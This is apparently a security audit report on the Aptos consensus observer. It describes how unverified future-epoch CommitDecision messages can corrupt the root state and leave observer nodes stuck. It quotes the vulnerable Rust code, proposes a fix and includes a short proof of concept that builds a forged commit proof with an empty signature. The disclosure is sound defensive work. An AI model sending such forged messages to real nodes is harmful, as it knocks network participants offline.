# Audit Report

## Title
Unverified CommitDecision with Future Epoch Causes Root Corruption and Consensus Observer DoS

## Summary
An attacker can send a `CommitDecision` message with a future epoch and arbitrary round value to corrupt the consensus observer's root state and cause a complete denial of service. The vulnerability exists because future-epoch commit decisions bypass signature verification but are still used to update critical internal state.

## Finding Description

The consensus observer processes `CommitDecision` messages containing commit proofs with epoch and round information. The vulnerability arises from the following flow:

1. When a `CommitDecision` arrives, the `round()` function extracts the round value directly from `commit_proof.ledger_info().round()` without any validation: [1](#0-0) 

2. In the message processing logic, the epoch and round are extracted BEFORE signature verification: [2](#0-1) 

3. These values are then used to filter messages by comparing against the highest committed epoch/round: [3](#0-2) 

4. Critically, signature verification is ONLY performed when the commit epoch matches the current epoch: [4](#0-3) 

5. For future-epoch commits (where `commit_epoch > epoch_state.epoch`), the code skips verification and proceeds directly to state sync handling: [5](#0-4) 

6. Most critically, the unverified commit decision is used to update the observer's root BEFORE state sync validation: [6](#0-5) 

7. The root update happens at line 282, which directly assigns the unverified commit proof: [7](#0-6) 

8. After the root is corrupted, `get_highest_committed_epoch_round()` returns the fake epoch/round from the manipulated root: [8](#0-7) 

9. The observer then starts state syncing to the non-existent target: [9](#0-8) 

10. When state sync fails, it only logs an error and exits without clearing the sync handle or sending a notification: [9](#0-8) 

11. The observer becomes stuck checking if state sync is complete: [10](#0-9) 

**Attack Scenario:**
1. Attacker sends `CommitDecision` with `epoch = current_epoch + 1` and `round = u64::MAX`
2. Observer extracts these values without validation
3. Signature verification is skipped (line 468 check fails for future epochs)
4. Root is updated to the fake commit (line 282 of block_data.rs)
5. State sync to non-existent target is initiated and fails
6. Observer is permanently stuck waiting for failed state sync
7. All legitimate messages with "lower" rounds are now rejected as stale

This breaks the **Consensus Safety** invariant by allowing an attacker to corrupt the observer's view of consensus state without any cryptographic validation.

## Impact Explanation

This is a **Critical Severity** vulnerability based on Aptos bug bounty criteria because it causes:

1. **Total loss of liveness/network availability** for the affected consensus observer node
2. **Significant protocol violations** by corrupting consensus state tracking
3. **Non-recoverable without manual intervention** (requires node restart and state cleanup)

The vulnerability affects all consensus observer nodes in the network and can be exploited by any network peer without requiring:
- Validator credentials
- Stake or governance power
- Cryptographic key compromise
- Network majority control

## Likelihood Explanation

**Likelihood: Very High**

- **Attack Complexity: Trivial** - A single malformed network message triggers the vulnerability
- **Attacker Requirements: Minimal** - Only requires network access to send messages to observers
- **No Authentication Required** - The attack succeeds before any signature verification occurs
- **Easily Reproducible** - The vulnerable code path is deterministic and always accessible
- **High Impact per Attack** - Each malicious message causes complete DoS until manual recovery
- **No Rate Limiting** - The vulnerability can be triggered repeatedly

## Recommendation

Add signature verification for ALL commit decisions before using them to update internal state, regardless of epoch. The fix should:

1. **Verify signatures before state updates:**
```rust
// In process_commit_decision_message, ALWAYS verify before using the commit
fn process_commit_decision_message(
    &mut self,
    peer_network_id: PeerNetworkId,
    message_received_time: Instant,
    commit_decision: CommitDecision,
) {
    let commit_epoch = commit_decision.epoch();
    let commit_round = commit_decision.round();
    
    // For future epochs, we cannot verify yet, so we should either:
    // Option 1: Buffer and verify later after epoch transition
    // Option 2: Request epoch proof first
    // Option 3: Reject and rely on legitimate messages after epoch transition
    
    let epoch_state = self.get_epoch_state();
    if commit_epoch != epoch_state.epoch {
        // DO NOT update root or trigger state sync for unverified future epochs
        warn!("Received commit decision for future epoch {} (current: {}). Ignoring until epoch transition.", 
              commit_epoch, epoch_state.epoch);
        return;
    }
    
    // Now verify before ANY state updates
    if let Err(error) = commit_decision.verify_commit_proof(&epoch_state) {
        error!("Failed to verify commit decision: {:?}", error);
        increment_invalid_message_counter(&peer_network_id, metrics::COMMIT_DECISION_LABEL);
        return;
    }
    
    // Only update state AFTER successful verification
    // ... rest of processing
}
```

2. **Never update root with unverified commits:**

The root should only be updated with commits that have passed cryptographic verification in the current epoch context.

## Proof of Concept

```rust
// Proof of Concept - Network message attack on consensus observer
// This demonstrates how to construct a malicious CommitDecision

use aptos_types::{
    block_info::BlockInfo,
    ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    aggregate_signature::AggregateSignature,
};
use aptos_crypto::hash::HashValue;

// Step 1: Create a fake commit decision with future epoch and arbitrary round
fn create_malicious_commit_decision(current_epoch: u64) -> CommitDecision {
    let malicious_epoch = current_epoch + 1;
    let malicious_round = u64::MAX; // Arbitrary high round
    
    // Create a fake BlockInfo
    let fake_block_info = BlockInfo::new(
        malicious_epoch,
        malicious_round,
        HashValue::random(),
        HashValue::random(),
        0, // version
        0, // timestamp
        None, // next_epoch_state
    );
    
    // Create a fake LedgerInfo
    let fake_ledger_info = LedgerInfo::new(fake_block_info, HashValue::random());
    
    // Create LedgerInfoWithSignatures with empty signature (doesn't matter - won't be verified)
    let fake_commit_proof = LedgerInfoWithSignatures::new(
        fake_ledger_info,
        AggregateSignature::empty(),
    );
    
    // Create the malicious CommitDecision
    CommitDecision::new(fake_commit_proof)
}

// Step 2: Send to consensus observer
// When the observer processes this message:
// - round() extracts u64::MAX without validation
// - Signature verification is skipped (future epoch)
// - Root is updated to this fake commit
// - State sync fails to find the target
// - Observer is stuck in perpetual waiting state
// - All legitimate messages are rejected as "stale"

// Expected behavior:
// - Observer root corrupted with epoch=current+1, round=u64::MAX
// - Observer enters infinite state sync wait
// - Observer stops processing all legitimate consensus messages
// - Requires manual node restart to recover
```

**Impact Demonstration:**
1. Send the malicious `CommitDecision` to a consensus observer
2. Observer's root becomes `(epoch: current+1, round: u64::MAX)`
3. Observer enters state sync mode and gets stuck
4. All subsequent legitimate messages with lower rounds are dropped
5. Observer cannot participate in consensus until manual restart
6. Attack can be repeated indefinitely against any observer node

### Citations

**File:** consensus/src/consensus_observer/network/observer_message.rs (L361-364)
```rust
    /// Returns the round of the commit proof
    pub fn round(&self) -> Round {
        self.commit_proof.ledger_info().round()
    }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L179-188)
```rust
        // If state sync is syncing to a commit decision, we should wait for it to complete
        if self.state_sync_manager.is_syncing_to_commit() {
            info!(
                LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                    "Waiting for state sync to reach commit decision: {:?}!",
                    self.observer_block_data.lock().root().commit_info()
                ))
            );
            return;
        }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L448-450)
```rust
        // Get the commit decision epoch and round
        let commit_epoch = commit_decision.epoch();
        let commit_round = commit_decision.round();
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L452-461)
```rust
        // If the commit message is behind our highest committed block, ignore it
        let get_highest_committed_epoch_round = self
            .observer_block_data
            .lock()
            .get_highest_committed_epoch_round();
        if (commit_epoch, commit_round) <= get_highest_committed_epoch_round {
            // Update the metrics for the dropped commit decision
            update_metrics_for_dropped_commit_decision_message(peer_network_id, &commit_decision);
            return;
        }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L466-482)
```rust
        // If the commit decision is for the current epoch, verify and process it
        let epoch_state = self.get_epoch_state();
        if commit_epoch == epoch_state.epoch {
            // Verify the commit decision
            if let Err(error) = commit_decision.verify_commit_proof(&epoch_state) {
                // Log the error and update the invalid message counter
                error!(
                    LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                        "Failed to verify commit decision! Ignoring: {:?}, from peer: {:?}. Error: {:?}",
                        commit_decision.proof_block_info(),
                        peer_network_id,
                        error
                    ))
                );
                increment_invalid_message_counter(&peer_network_id, metrics::COMMIT_DECISION_LABEL);
                return;
            }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L497-527)
```rust
        // TODO: identify the best way to handle an invalid commit decision
        // for a future epoch. In such cases, we currently rely on state sync.

        // Otherwise, we failed to process the commit decision. If the commit
        // is for a future epoch or round, we need to state sync.
        let last_block = self.observer_block_data.lock().get_last_ordered_block();
        let epoch_changed = commit_epoch > last_block.epoch();
        if epoch_changed || commit_round > last_block.round() {
            // If we're waiting for state sync to transition into a new epoch,
            // we should just wait and not issue a new state sync request.
            if self.state_sync_manager.is_syncing_through_epoch() {
                info!(
                    LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                        "Already waiting for state sync to reach new epoch: {:?}. Dropping commit decision: {:?}!",
                        self.observer_block_data.lock().root().commit_info(),
                        commit_decision.proof_block_info()
                    ))
                );
                return;
            }

            // Otherwise, we should start the state sync process for the commit.
            // Update the block data (to the commit decision).
            self.observer_block_data
                .lock()
                .update_blocks_for_state_sync_commit(&commit_decision);

            // Start state syncing to the commit decision
            self.state_sync_manager
                .sync_to_commit(commit_decision, epoch_changed);
        }
```

**File:** consensus/src/consensus_observer/observer/block_data.rs (L131-141)
```rust
    /// Returns the highest committed block epoch and round
    pub fn get_highest_committed_epoch_round(&self) -> (u64, Round) {
        if let Some(epoch_round) = self.ordered_block_store.get_highest_committed_epoch_round() {
            // Return the highest committed epoch and round
            epoch_round
        } else {
            // Return the root epoch and round
            let root_block_info = self.root.commit_info().clone();
            (root_block_info.epoch(), root_block_info.round())
        }
    }
```

**File:** consensus/src/consensus_observer/observer/block_data.rs (L275-291)
```rust
    pub fn update_blocks_for_state_sync_commit(&mut self, commit_decision: &CommitDecision) {
        // Get the commit proof, epoch and round
        let commit_proof = commit_decision.commit_proof();
        let commit_epoch = commit_decision.epoch();
        let commit_round = commit_decision.round();

        // Update the root
        self.update_root(commit_proof.clone());

        // Update the block payload store
        self.block_payload_store
            .remove_blocks_for_epoch_round(commit_epoch, commit_round);

        // Update the ordered block store
        self.ordered_block_store
            .remove_blocks_for_commit(commit_proof);
    }
```

**File:** consensus/src/consensus_observer/observer/block_data.rs (L299-302)
```rust
    /// Updates the root ledger info
    pub fn update_root(&mut self, new_root: LedgerInfoWithSignatures) {
        self.root = new_root;
    }
```

**File:** consensus/src/consensus_observer/observer/state_sync_manager.rs (L218-230)
```rust
                // Sync to the commit decision
                if let Err(error) = execution_client
                    .clone()
                    .sync_to_target(commit_decision.commit_proof().clone())
                    .await
                {
                    error!(
                        LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                            "Failed to sync to commit decision: {:?}! Error: {:?}",
                            commit_decision, error
                        ))
                    );
                    return;
```
